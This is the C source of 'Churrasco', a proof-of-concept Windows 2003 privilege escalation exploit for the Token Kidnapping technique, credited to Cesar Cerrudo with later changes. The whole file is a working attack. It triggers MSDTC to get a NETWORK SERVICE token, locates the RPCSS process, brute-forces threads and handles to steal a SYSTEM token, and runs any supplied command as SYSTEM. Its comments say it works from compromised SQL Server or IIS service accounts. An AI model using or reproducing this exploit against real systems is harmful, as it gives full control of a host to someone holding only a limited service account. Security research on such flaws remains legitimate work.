//  Argeniss - Information Security - www.argeniss.com

//	**Churrasco**

//	Elevation of privileges PoC exploit for Token Kidnapping on Windows 2003
//  http://www.argeniss.com/research/TokenKidnapping.pdf

//  Author: Cesar Cerrudo
//  Following hacks by icesurfer: 
//		- added debug option (no output by default)
//		- current directory is the one of the calling process

//	Needs impersonation and assign primary token rights in order to work, by default NETWORK SERVICE and LOCAL SERVICE accounts have these rights
//  Works fine in SQL Server running under any Windows account.
//	Works fine in IIS only when ASP .NET Application Pool is running under NETWORK SERVICE or LOCAL SERVICE accounts, it needs some minor modifications to 
//	work on an Application Pool running under a regular user account since this kind of account will be able to impersonate but wonn't have assign primary token right by default

// Netstat code taken from http://www.codeguru.com/forum/archive/index.php/t-188092.html by ashotog


#include "stdafx.h"
#include <stdarg.h>

int verbose = 0;

void pdebug(const char *fmt, ...)
{
	va_list arg;
	if (verbose > 0) {
		va_start(arg, fmt);
		vprintf(fmt, arg);
		va_end(arg);
	}
}

BOOL InvokeMSDTC(){
//IIRC this code was taken from MSDN
	ITransactionDispenser * pTransactionDispenser;
	ITransaction * pTransaction;
	HRESULT hr = S_OK ;
 
	// Obtain a transaction dispenser interface pointer from the DTC.
	DtcGetTransactionManagerEx(NULL,NULL,IID_ITransactionDispenser,0,0, (void **)&pTransactionDispenser);
	if (FAILED (hr)) {
		pdebug("/currasco/-->MSDTC service seems to have problems\n");
		return (0);
	}

	pTransactionDispenser->BeginTransaction( NULL,ISOLATIONLEVEL_ISOLATED, ISOFLAG_RETAIN_DONTCARE, NULL, &pTransaction ) ; 

	return 1;
}


typedef struct _MIB_TCPROW_EX
{
DWORD dwState; // MIB_TCP_STATE_*
DWORD dwLocalAddr;
DWORD dwLocalPort;
DWORD dwRemoteAddr;
DWORD dwRemotePort;
DWORD dwProcessId;
} MIB_TCPROW_EX, *PMIB_TCPROW_EX;

typedef struct _MIB_TCPTABLE_EX
{
DWORD dwNumEntries;
MIB_TCPROW_EX table[ANY_SIZE];
} MIB_TCPTABLE_EX, *PMIB_TCPTABLE_EX;

typedef struct _MIB_UDPROW_EX
{
DWORD dwLocalAddr;
DWORD dwLocalPort;
DWORD dwProcessId;
} MIB_UDPROW_EX, *PMIB_UDPROW_EX;

typedef struct _MIB_UDPTABLE_EX
{
DWORD dwNumEntries;
MIB_UDPROW_EX table[ANY_SIZE];
} MIB_UDPTABLE_EX, *PMIB_UDPTABLE_EX;


typedef DWORD (WINAPI *PROCALLOCATEANDGETTCPEXTABLEFROMSTACK)(PMIB_TCPTABLE_EX*,BOOL,HANDLE,DWORD,DWORD);
PROCALLOCATEANDGETTCPEXTABLEFROMSTACK lpfnAllocateAndGetTcpExTableFromStack = NULL;

BOOL LoadExIpHelperProcedures(void)
{
	HMODULE hModule;

	hModule = LoadLibrary(_T("iphlpapi.dll"));
	if (hModule == NULL)
		return FALSE;

	// XP and later
	lpfnAllocateAndGetTcpExTableFromStack = (PROCALLOCATEANDGETTCPEXTABLEFROMSTACK)GetProcAddress(hModule,"AllocateAndGetTcpExTableFromStack");
	if (lpfnAllocateAndGetTcpExTableFromStack == NULL)
		return FALSE;

	return TRUE;
}

BOOL IsImpersonationToken (HANDLE hToken, CHAR * cType)
{
	DWORD							ReturnLength;
	SECURITY_IMPERSONATION_LEVEL	TokenImpInfo;
	TOKEN_TYPE						TokenTypeInfo;

	if(GetTokenInformation(hToken, TokenType,  &TokenTypeInfo, sizeof(TokenTypeInfo), &ReturnLength)){
		if (TokenTypeInfo==TokenImpersonation) {
			if((GetTokenInformation(hToken, TokenImpersonationLevel,  &TokenImpInfo, sizeof(TokenImpInfo), &ReturnLength)&& TokenImpInfo==SecurityImpersonation)){
				if (cType) *cType='I';
				return TRUE;
			}
        }
		else { 
			if (cType) *cType='P'; //it's a primary token, TokenTypeInfo==TokenPrimary
			return TRUE; 
		}
	}

	return FALSE;
}

DWORD RunCommandAsSystem(HANDLE hToken, LPSTR lpCommand, char * CurrentDir)
{
	HANDLE				hToken2,hTokenTmp;
	PROCESS_INFORMATION pInfo;
	STARTUPINFO         sInfo;
	DWORD				dwRes;
	CHAR				cType;
	LPTSTR				lpComspec;
	LPSTR				lpCommandTmp;


    ZeroMemory(&sInfo, sizeof(STARTUPINFO));
    ZeroMemory(&pInfo, sizeof(PROCESS_INFORMATION));
    sInfo.cb= sizeof(STARTUPINFO);
    sInfo.lpDesktop= "WinSta0\\Default"; 
 
	IsImpersonationToken(hToken, &cType);

	if (cType=='I'){
		SetThreadToken(NULL, hToken);
		OpenThreadToken(GetCurrentThread(),TOKEN_ALL_ACCESS,FALSE,&hTokenTmp);
		SetThreadToken(NULL, NULL);
	}
	else 
		hTokenTmp=hToken;

	DuplicateTokenEx(hTokenTmp,MAXIMUM_ALLOWED,NULL,SecurityImpersonation, TokenPrimary,&hToken2) ;

	lpComspec= (LPTSTR) malloc(1024*sizeof(TCHAR));
	GetEnvironmentVariable("comspec",lpComspec,1024);

	lpCommandTmp= (LPSTR) malloc(1024*sizeof(CHAR));

	strcpy(lpCommandTmp, "/c  ");
	strncat(lpCommandTmp, lpCommand, 500);
	
	dwRes=CreateProcessAsUser(hToken2, lpComspec, lpCommandTmp, NULL, NULL, TRUE, NULL, NULL, CurrentDir, &sInfo, &pInfo);
	
	if (hTokenTmp!=hToken)
		CloseHandle(hTokenTmp);

	CloseHandle(hToken2);

	return dwRes;


}


DWORD GetRpcssPid(void)
{
	DWORD dwLastError, dwPort, dwSize, dwPid=0;
	PMIB_TCPTABLE_EX lpBuffer = NULL;
	PMIB_UDPTABLE_EX lpBuffer1 = NULL;

	if (!LoadExIpHelperProcedures())
		return 0;

	dwLastError = lpfnAllocateAndGetTcpExTableFromStack(&lpBuffer,TRUE,GetProcessHeap(),0,2);
	if (dwLastError == NO_ERROR)
	{
		for (dwSize = 0; dwSize < lpBuffer->dwNumEntries; dwSize++)
		{
			dwPort=((lpBuffer->table[dwSize].dwLocalPort & 0xFF00) >> 8) + ((lpBuffer->table[dwSize].dwLocalPort & 0x00FF) << 8);
			
			if (dwPort==135 && lpBuffer->table[dwSize].dwState == 2)
			{
				dwPid = lpBuffer->table[dwSize].dwProcessId ;
				break;
			}
		}
	}

	if (lpBuffer)
		HeapFree(GetProcessHeap(),0,lpBuffer);

	return dwPid;
}




BOOL GetTokenUser(HANDLE hToken, LPTSTR lpUserName)
{
	DWORD			dwBufferSize = 0;
	SID_NAME_USE	SidNameUse;
	TCHAR			DomainName[MAX_PATH];
	DWORD			dwUserNameSize= MAX_PATH * 2 ;
	DWORD			dwDomainNameSize = MAX_PATH * 2;
	PTOKEN_USER		pTokenUser;

	GetTokenInformation(hToken, TokenUser, NULL,0,&dwBufferSize);
	
	pTokenUser = (PTOKEN_USER) new BYTE[dwBufferSize];
	memset(pTokenUser, 0, dwBufferSize);

	if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwBufferSize, &dwBufferSize)){
		if (LookupAccountSid(NULL,pTokenUser->User.Sid,lpUserName,&dwUserNameSize,DomainName,&dwDomainNameSize,&SidNameUse)){
			return TRUE;
		}
	}
	
	return FALSE;
}




HANDLE GetSystemToken(HANDLE hToken,DWORD Pid){
	HANDLE		hTgtHandle=0;
	TCHAR		UserName[MAX_PATH];
	HANDLE		hProcess;
	
	SetThreadToken(NULL,hToken);

	hProcess=OpenProcess(PROCESS_DUP_HANDLE,NULL,Pid);
	
	SetThreadToken(NULL,NULL);	

	if (hProcess) {	
		//Brute force token handles
		for (DWORD hSrcHandle=4;hSrcHandle<0xffff;hSrcHandle+=4){
			if(DuplicateHandle(hProcess,(HANDLE)hSrcHandle,GetCurrentProcess(),&hTgtHandle,0,FALSE,DUPLICATE_SAME_ACCESS ))	{	
				if (IsImpersonationToken(hTgtHandle, NULL)){
					if (GetTokenUser(hTgtHandle,UserName)){
						if (!strcmp(UserName,"SYSTEM")){
							pdebug ("/churrasco/-->Found SYSTEM token 0x%x\n",hTgtHandle);
							return hTgtHandle;
						}
						else
							pdebug ("/churrasco/-->Found %s Token\n", UserName);
					}
				}
				CloseHandle(hTgtHandle);
			}
		}
		CloseHandle(hProcess);
	}
	else {
		pdebug ("/churrasco/-->Couldn't open Rpcss process\n");
		return 0;
	}

	return 0;

}
//need to improve this!!!!
HANDLE GetNetServToken(){
	HANDLE		hToken;
	TCHAR		UserName[MAX_PATH];

	for (DWORD j=0x4;j<=0xffff;j+=4){
		hToken=(HANDLE)j;
		if (IsImpersonationToken(hToken, NULL) ){
			if(GetTokenUser(hToken, UserName)){
				if (!strcmp(UserName,"NETWORK SERVICE")){
					pdebug ("/churrasco/-->Found NETWORK SERVICE token 0x%x\n",hToken);
					return hToken;
				}
				else 
					pdebug ("/churrasco/-->Found %s Token\n",UserName);
			}
		}
	}
	return 0;
}


int _tmain(int argc, _TCHAR* argv[])
{
	DWORD	dwRpcssPid;
	TCHAR	UserName[MAX_PATH];
	DWORD	dwCharCount = MAX_PATH;
	LPSTR	lpCommand;
	HANDLE	hToken, hSysToken, hNetServToken=0;

	if (argc < 2) {
		printf ("/churrasco/-->Usage: Churrasco.exe [-d] \"command to run\"\n");
		printf(getenv("TEMP"));
		printf("\n");
		return 0;
	}

	if ((argc > 2) && (strcmp(argv[1],"-d") == 0)) {
		verbose = 1;
		lpCommand = argv[2];
	} else {
		lpCommand= argv[1];
	}

	if(GetUserName(UserName, &dwCharCount)){
		pdebug ("/churrasco/-->Current User: %s \n",UserName);
		if (strcmp(UserName,"NETWORK SERVICE")){
			pdebug ("/churrasco/-->Process is not running under NETWORK SERVICE account!\n");
			pdebug ("/churrasco/-->Getting NETWORK SERVICE token ...\n");
			
			//Call MSDTC to end up getting NETWORK SERVICE token in our process
			InvokeMSDTC();

			//Get NETWORK SERVICE impersonation token
			hNetServToken=GetNetServToken();
			if (hNetServToken==0){
				pdebug ("/churrasco/-->Couldn't find NETWORK SERVICE token\n");
				return 0;
			}
		}
	}
	else {
		pdebug ("/churrasco/-->Couldn't get current user name\n");
		return 0;

	}
	
	//Get RPCSS PID
	pdebug ("/churrasco/-->Getting Rpcss PID ...\n");
	dwRpcssPid=GetRpcssPid();
	
	//Set NETWORK SERVICE token as current thread token so we can open RPCSS threads
	SetThreadToken(NULL,hNetServToken);

	if (dwRpcssPid){
		pdebug ("/churrasco/-->Found Rpcss PID: %d \n",dwRpcssPid);

        //Brute force threads id, I'm lazy to use native APIs, this works the same
		pdebug ("/churrasco/-->Searching for Rpcss threads ...\n");
		for (DWORD Tid=0;Tid < 0xffff ;Tid+=4) {
			HANDLE hThread=OpenThread(THREAD_ALL_ACCESS,TRUE,Tid);
			
			if (hThread && dwRpcssPid==GetProcessIdOfThread(hThread)) { 
				pdebug ("/churrasco/-->Found Thread: %d \n",Tid);
				
				//Make thread impersonate Rpcss service account
				QueueUserAPC((PAPCFUNC)ImpersonateSelf,hThread,0x2 );

				Sleep(500);
				
				//If RPCSS thread is impersonating then we can get RPCSS process token
				if (OpenThreadToken(hThread,TOKEN_ALL_ACCESS,FALSE,&hToken)){
					pdebug ("/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x%x\n",hToken);
					pdebug ("/churrasco/-->Getting SYSTEM token from Rpcss Service...\n");
					
					//Get SYSTEM token from RPCSS service
					hSysToken=GetSystemToken(hToken,dwRpcssPid);
					if (hSysToken){
						pdebug ("/churrasco/-->Running command with SYSTEM Token...\n");
						if (RunCommandAsSystem(hSysToken, lpCommand, getenv("TEMP"))){
							pdebug ("/churrasco/-->Done, command should have ran as SYSTEM!\n");
							break;
						}
						else {
							pdebug ("/churrasco/-->Couldn't run command, try again!\n");
							return 0;
						}
					}
				}
				pdebug ("/churrasco/-->Thread not impersonating, looking for another thread...\n");		
			}
			CloseHandle(hThread);
		}
	}
	else {
		pdebug ("/churrasco/-->Couldn't find Rpcss PID!\n");
	}
	return 0;
}

